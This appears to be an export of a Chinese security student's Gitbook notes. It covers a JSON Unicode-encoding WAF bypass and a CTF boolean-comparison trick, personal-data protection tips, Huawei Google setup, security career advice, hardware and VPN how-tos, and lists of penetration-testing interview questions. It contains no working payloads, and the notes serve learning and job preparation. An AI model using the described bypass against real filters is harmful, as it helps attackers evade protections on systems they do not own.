shop学习Unicode安全隐患 – 大彪的小站 查询： https://unicode-table.com/cn/blocks/ https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals JSON json编码 字符串支持unicode编码 过滤位置出错 后端接收JSON数据，没有先对其进行解码等处理，而直接对其进行操作如判断，过滤 过滤 function waf($str) { xxxx; } $body = file_get_contents('php://input'); waf($body); $data = json_decode($body, true); 对于这种情况，只需要对提交的JSON数据进行UNICODE编码即可绕过waf。 判断比较 $numbers=file_get_contents('php://input'); #获取ajax请求的数据 for($i=0; $i 将$numbers的每一位与待比较数字逐字比较 因为json支持数组和布尔类型的数据，所以可以构造json数据为{numbers:[true,true,true,true,true,true,true]} 只要待比较数字$win_numbers的每一位都大于0，即可输出flag 参考文章 HTML字符集 (w3school.com.cn) 30余种加密编码类型的密文特征分析（建议收藏） - 云+社区 - 腾讯云 (tencent.com) python中的编码 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:15:59 "},"08.杂七杂八/个人信息保护.html":{"url":"08.杂七杂八/个人信息保护.html","title":"个人信息保护","keywords":"","body":"盒武器 sgk 微博2019年 学习通2022年 上海ga2022年 淘宝 内鬼赚外快 国外APP注册 giffgaff英国卡，10英镑理论保号25年 https://giffgaffsim.notion.site/giffgaff-2024-e62d10bf0e944a129bc31c5b0d240f8d#2fb9791c5d6e42a5811be12659859996 https://post.smzdm.com/p/a4pklgz8/ https://www.v2ex.com/t/971919 身份证加水印 浏览器不保存密码 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 16:10:51 "},"08.杂七杂八/华为安装谷歌.html":{"url":"08.杂七杂八/华为安装谷歌.html","title":"华为安装谷歌","keywords":"","body":"安装谷歌框架 因为某些不可抗因素，在2019年，谷歌宣布全面切断与华为的合作，不再允许华为手机使用谷歌的GMS服务。 导致许多依赖Google服务的应用无法正常的安装、运行。 手机设备信息：Nove7SE，EMUI版本10.1.1 华谷套件 按照步骤走即可，遇到的问题： 第六步安装microg时出现系统已存在更高版本无法安装 关闭隐私空间，应用分身，纯净模式，用户与账户中应只有一个账户 play保护机制认证 拿到gsfid进行注册Google 服务框架 Android ID注册，还是不能通过认证参考华为设备【未获得play保护机制认证】的解决方法_哔哩哔哩_bilibili ​ 虽然还是显示设备未通过认证，但能够正常使用play商店，youtube等，游戏即使显示设备异常但重新打开游戏也能进入正常游玩。 ​ 一个月后续 又弹出了play保护机制认证，但是相关APP还是可以正常使用，把play商店的通知关了就行 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 16:53:23 "},"08.杂七杂八/安全方向.html":{"url":"08.杂七杂八/安全方向.html","title":"安全方向","keywords":"","body":"开发：安全开发和普通开发没有太多的区别，取决于安全公司的技术栈和产品线，对标一般中小厂薪资和技术。这里值得一提的是很多产品线是从外面买的，甚至就几个人在维护和开发，所以有时候你会需要去读一座屎山，而且找不到什么人对接。刚毕业薪资应该在6-10k，看城市上浮。 红队：重头戏。这个方向国内的就业是甲方的安全私军和乙方的安全团队。两边共同的特点是需要技术，技术越高越好。甲方安全私军大多见于银行、证券等金融行业，少部分互联网公司也有，外企较少（一下子只想得起来特斯拉）。最近两年额外增加了车联网方向的渗透，应该是合规强制要求。乙方也不多，各大安全公司都会养渗透，比较出名的是一哥的A team和Z team。薪资都不低，本科刚毕业的话总包15w起步，到30w多的我见过，再高没见过。 同样你也可以选择单干，选这条路我祝你好运，hacker one和补天等各大SOC会是你的家。 蓝队：容纳人数最多的行业，甲方需要人盯监控干合规干杂活，乙方需要人来帮甲方盯监控干杂活。我过去跟朋友说安全行业其实不算太差，就是因为这个人数最多的兜底岗位比其他行业的兜底岗位要好太多了。事不多，工资相对高，而且门槛不高。我会建议你找个大公司做安全，一般一个人负责这整个部分，轻松、稳定，工资刚毕业大概在7-9k，随城市和公司上浮。如果刚毕业就进乙方的话就有点点糟糕了，6-8k并且不稳定，找机会跳甲方吧。 安全研究：这个你可能暂时不要想，这基本是科研和一部分红队在做，典型见于各大安全公司的工作室，硕士起步或者对这方面有很深的研究，目标是刷奖和感谢信，为公司挣面子。薪资不透明，一个个都瞒很紧，我没细问。 合规审核：最典型的就是等保（密评好像快强制了），其实可以拆进乙方安全运营里面。这方面市场不大不小，一般是大公司的一个分支业务，或者中小公司在做，考一个证（27001审核，等保测评师，密评测评师等）然后进去做就完事。没有什么积累，出差非常频繁，建议是不到万不得已不要做。薪资还不错的，6-8k随城市和项目上涨。 二进制相关：这个方向单独提出来是因为难。虽然理论上学校里会教一些，但是真要入门那要耐得住寂寞。门槛高，需求少，但是收入高，成就也好。 密码学：所有安全方向都会着重开密码学的课，但是这确实是个对于就业没有任何帮助的方向。最幽默的就是国内硕导普遍很水，但是为了不显示出自己完全没有实际经验和技术，他们就必须找个方向深入。渗透没经验，内核太难，安规要资源，最后一看，嘿，就密码学好糊弄。于是导致了现在国内硕士网络空间安全专业大批量在水密码学相关的研究，本科也在强调这门课。我对此的建议是不要碰，了解下基本概念就完事了。 我暂时能想到的方向就这些。接下来是一些实际的建议。 我很理解你的迷茫，技术一般，眼看着没法吃渗透饭，但是市场上又在强调信息安全就业好想要靠这个弯道超车。所以我建议你两手准备，代码是一切的基础，你代码能力够好在安全方面混饭吃也会很容易，所以你的编程能力绝对不能丢。但同时也要着眼于甲方安全运营、甲方渗透、安全开发这三个方向。尽可能去boss或者其他软件看JD，看大量的JD，按照大公司的技术方向去调整你的技术栈。这三个方向只要你入行，都能够保证你比普通开发更能混饭吃。而提前准备技术栈能够在你跨过学历门槛之后快速让大公司对你感兴趣，更容易进去。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 23:14:33 "},"08.杂七杂八/手机VPN共享.html":{"url":"08.杂七杂八/手机VPN共享.html","title":"手机VPN共享","keywords":"","body":" 起因：PC连接内网需要在安装管控终端下使用VPN，手机不需要，但是手机不好进行操作 安装proxy server 点击左上角add添加proxy server，只需要填写服务器名字后返回保存即可 start启动 电脑代理设置，手机IP可以点击info查看 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 17:10:11 "},"08.杂七杂八/换内存条.html":{"url":"08.杂七杂八/换内存条.html","title":"如何更换内存条","keywords":"","body":" 好多年前的电脑了，内存有点不够，内网靶场开不起来😭 如何选择适合电脑的内存条 工具 CPU-Z | Softwares | CPUID AIDA64 v6.92.6600 便携版 - 果核剥壳 (ghxi.com) 关注信息 支持的内存条类型和最大内存大小 几个插槽（支持几条内存条） 内存条频率 这里看到的是800MHZ，实际上是1600MHZ，在任务管理器中可以看到 内存频率只有一半？别急 系统只是告诉了你事实 - 知乎 (zhihu.com) 制造商：组双通道最好一致 电压 低电压：1.35V 标准电压：1.5V 综上我最好去京东上购买DDR3规格，海力士品牌，内存条频率为1600MHZ，低电压，内存大小 装内存条 红框处即为内存条 红框处向外拉，取出内存条，然后新内存条30°插入箭头所指后，用点力向下压，听到哒的一声就OK了 内存成功变为16GB Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:47:58 "},"08.杂七杂八/面试记录.html":{"url":"08.杂七杂八/面试记录.html","title":"笔/面记录","keywords":"","body":"HW面试 大概是三次面试的集合去了重的，结果还是去了实习 自我介绍 之前护网主要做什么 设备使用 用过哪些安全设备，具体产商，具体怎么用（语法是什么） 负责外网还是内网，有很多误报怎么办 如何判断攻击成功 sql注入相关 sql注入原理，方式，防御手段 宽字节注入原理 sql写shell的条件，具体的语句（追问：除了直接写入还有其他方法吗) sqlmap写shell的参数和原理 使用sqlmap post注入的参数 sql注入绕过waf的方式 sql注入延时注入时，sleep函数被禁用了怎么办 渗透测试流程从信息收集开始完整地讲讲 xxe有哪些利用方式 给你一个场景，thinkphp，可以文件上传，但是有白名单只能上传图片，怎么rce 了解过burp的dns功能吗 追问： 看过dnslog日志吗 讲一下挖矿木马的处置 追问： 要用什么命令定位进程所对应的可执行文件 新增用户怎么排查（windows和linux） 用什么命令排查linux的特权用户 一直杀不掉怎么办（要看哪些文件/目录） java内存马类型 追问： 各自原理 冰蝎的木马原理了解过吗 渗透中如果机器不出网怎么办 追问 用的什么反向代理 如果可以rce，但是无回显并且不出网怎么办 如果机子被上了cs木马，怎么检测出木马进程 wireshark用过吗 假设上传了webshell，攻击者会使用webshell管理工具进行连接，讲一下这些管理工具的流量特征 讲一下java的shiro，log4j等漏洞 有做过溯源吗，了解的说说 简历上说挖掘过逻辑漏洞，现在给你一个登录框，你有什么思路 假设有一个存储型xss，怎么进行持久化 如果通知机器上出现了一些可疑的文件和目录，怎么进行应急响应 讲一下文件上传黑白名单绕过 追问 中间件解析漏洞讲讲 主机基线规范讲一下 如果护网期间出现了0day该怎么办 讲一下内网中的票据 windows事件状态码 渗透测试实习 自我介绍 讲一下反序列化漏洞 dnslog了解吗，是在命令有回显还是无回显的时候用 dnslog和反弹shell有什么区别 一句话木马和内存马有什么区别 常见的waf绕过方式 文件上传讲讲 逻辑漏洞知道哪些 未授权访问漏洞你是怎么挖到的 sql注入你会用到哪些函数 spring框架漏洞 阿里的druid了解吗 docker容器漏洞，在实战中有遇见过吗 weblogic框架漏洞 知道哪些CMS 若依CMS漏洞知道吗 2022年以后的漏洞知道哪些 你了解我们公司吗 你怎么看待加班 信息安全工程师笔试 某游戏厂，绝大部分都是数据结构，概率统计，算法？？？ Web安全工程师笔试 “`”符号（反单引号）在PHP语言以及SQL语言中的作用分别是什么 Python语句'int'.__class__的含义是什么，该语句和什么漏洞有关 Java中的反射有什么作用 Java反序列化的基本原理 SSRF漏洞有什么漏洞利用思路？ 利用XSS漏洞可以达到什么效果？有哪些防御XSS漏洞的手段/机制？ 联合查询注入如何判断表中列的数量（除了使用order by） 描述一下SQL二次注入漏洞的原理 描述一下PHP反序列化漏洞的原理 JWT是什么；Cookie和Session的区别是什么 描述一下Shiro550漏洞的原理 sqlmap --os-shell参数分别在面对MySQL和MSSQL数据库中执行的原理 sqlmap中--technique和--dbms参数的含义是什么 nmap使用哪个参数可以做到对目标只探测存活，但不进行端口扫描 22、1433、1521、2375、3306、3389、6379、7001端口对应的服务名称分别是什么 描述一下Redis未授权访问漏洞的利用方式 想通过SQL注入漏洞写shell（被攻击目标是MySQL、Apache、PHP），需要被攻击方满足什么条件？MySQL中，可以写入文件的两条指令分别是什么，这两条指令的区别是什么？ 凭印象列举几个举世闻名的漏洞名称及其CVE编号 对于渗透中常见的中间件、框架或组件，你会用什么工具去对他进行漏洞扫描？(具体到中间件、框架或组件及对应工具的名称) 如果发现了网站有任意文件读取漏洞，你接下来有什么测试思路？ 对于链接demo.do?DATA=dWlkPTE2==，你有什么测试思路？ 扫目录发现swagger.json，你有什么测试思路？ 遇到只有一个登录框页面的网站，你有哪些测试思路 描述对手机App（Android/IOS）进行测试的思路和做法 具体到工具的名称 描述对微信小程序进行测试的思路和做法 给你单个IP地址，让你对它进行全面的渗透测试，你的思路和做法是什么？（此处写明你会使用到的工具的名称。比如不要只说“使用工具进行漏洞扫描”，具体到：“使用xxx工具进行漏洞扫描” ） 获取到边界服务器的权限后，有哪些方法可以快速找出内网中可能存活的主机 Windows和Linux使用命令行下载文件的方式分别有哪些？（可以只写命令的名称，不用写全命令完整参数） 描述你常用的端口转发及代理隧道的搭建方式 xray是哪家公司开发的，是用什么语言编写的？goby是哪家公司开发的，是用什么语言写的？ 描述一下你的优势 ，以及能为公司创造什么价值 请谈一谈你的职业规划 请介绍下你的性格 请介绍一下你对于网络安全学习的热情 安服/渗透笔试 绿盟80题，其中不定项选择题少选，错选都不得分，10道简答题 深信服30道选择题 奇安信40道选择题 亚信25道选择题，10道简答题 选择题 Web安全 应急响应 Linux 计算机网络 Android渗透相关（绿盟） 密码学相关（绿盟，其他的也有考一点） 简答题 内网：信息收集，隧道搭建，内网大体思路 外网：特定场景下的渗透思路 个人特点和职业规划（亚信） 项目实施（亚信） Java代码审计（绿盟） 应急响应思路（绿盟） 恶意样本分析思路（绿盟） 安服面试 绿盟要求高，感觉啥都要会，每次都问我入职实习能不能来？？ 深信服没咋问技术型问题，更看重的是你的软实力，比如安全行业认知，学习方法，性格品质等是否匹配，搞去安全运营了。 绿盟一面 30min 自我介绍 做过哪些系统 比较难忘的渗透测试经历或者说学到东西的 shiro是什么 shiro权限绕过的原理 shiro权限校验是怎么做的，看过相关代码吗 讲讲其他越权 怎么做权限绕过的修复（面试官还引导了很多，太菜了具体的实现不会） 常见waf绕过的方式 文件上传哪一个点可以尝试绕过waf APP渗透IOS的接触过嘛 APP有壳怎么办 APP测试讲一下，客户端和本地端来讲 抓包怎么抓的 HTTP双向认证怎么绕过 反问 绿盟二面 45min 自我介绍 渗透实习干了啥 对金融和能源行业的公司渗透有没有自己的一些心得（回答了后，问你这个是打点吗？） 内网渗透有实际做过吗（实习生没给分配做😅） 给你一个系统，你觉得要从哪几个方面进行测试 谈谈对安全服务的了解（答完面试官说对安全服务的理解太浅了。。） SRC有没有比较好的排名 你这个CTF拿的奖横向对比有点少，是有什么原因吗（不是我就打了一年，大家积极性也不够，我有啥办法😭） 会代码审计吗，有没有自己审出过0Day 讲讲挖SRC或者实习时候印象比较深刻的两个洞 熟悉哪种数据库，讲讲这个数据库sql注入绕过waf的方式 用python写过什么脚本 讲讲小程序的渗透 fastjson了解吗 fastjson不出网怎么利用 反问环节 深信服一面 线下30min 线下酒店环境不错，不过看到其他岗位群面有点哈人 安服单面聊的挺开心🤣，记得的就这些 自我介绍 你在学校里有当过什么职位吗？ 志愿活动中有没有什么让你比较印象深刻的事情 你有没有想过他们的资金来源是什么呢 你通过哪些方法来进行学习？ 你除了写博客，还有没有在一些社区投稿文章的 交换机与路由器是什么 代码审计你会哪些语言，然后给了几行PHP代码让你现场审计（打过CTF的一眼就会很简单） 讲一下外网思路（有点忘了，反正是跟红队有关） 反问环节 深信服二面 45min 记不大得 自我介绍（讲讲在学校的学习经历和这个实习经历） 你是信息安全专业的？ 为什么要转专业呢？ 除了兴趣还有什么原因呢？比如说薪酬之类的 你有什么职业规划吗？ 你课余时间会做什么？ 你在学校或者实习中遇到的最大的困难是什么？ 如果和别人发生了冲突，你会怎么做？ 说一下你的优缺点，各说2-3个 你通过哪些方法来进行学习？ 你对我们公司的业务有什么了解吗？ 反问环节 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-06-25 20:51:26 "}}